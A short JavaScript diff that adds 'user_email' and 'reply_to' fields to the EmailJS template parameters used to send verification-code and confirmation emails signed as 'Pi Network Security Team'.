@@ -96,10 +96,12 @@ async function sendVerificationCode(email) {
 
         // EmailJS template parameters
         const templateParams = {
+            user_email: email,
             to_email: email,
             verification_code: verificationCode,
             to_name: email.split('@')[0], // Use email username as name
-            from_name: 'Pi Network Security Team'
+            from_name: 'Pi Network Security Team',
+            reply_to: email
         };
 
         // Send email via EmailJS
@@ -141,9 +143,11 @@ async function sendVerificationCode(email) {
 async function sendConfirmationEmail(email) {
     try {
         const templateParams = {
+            user_email: email,
             to_email: email,
             to_name: email.split('@')[0],
             from_name: 'Pi Network Security Team',
+            reply_to: email,
             confirmation_date: new Date().toLocaleString('en-US', {
                 weekday: 'long',
                 year: 'numeric',
